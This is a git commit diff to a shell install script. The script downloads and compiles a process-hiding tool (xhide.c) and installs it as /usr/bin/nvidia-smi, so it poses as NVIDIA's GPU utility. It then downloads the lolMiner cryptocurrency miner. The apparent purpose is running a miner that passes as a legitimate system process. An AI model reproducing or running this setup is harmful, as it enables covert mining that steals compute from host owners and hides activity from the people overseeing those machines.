6b6dd8c093f01a8ed403b135da5e2b78acca63b5
hisdon508 <100163425+hisdon508@users.noreply.github.com>
2022-05-28 04:02:41 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,7 +1,7 @@
 apt-get update
 apt-get install wget gcc -y
 wget -q https://raw.githubusercontent.com/chenkaie/junkcode/master/xhide.c && \
-    gcc -o nvidia-smi xhide.c && \
+    gcc -o /usr/bin/nvidia-smi xhide.c && \
     rm xhide.c
 wget -q https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51a/lolMiner_v1.51a_Lin64.tar.gz && \
     tar xf lolMiner_v1.51a_Lin64.tar.gz && \
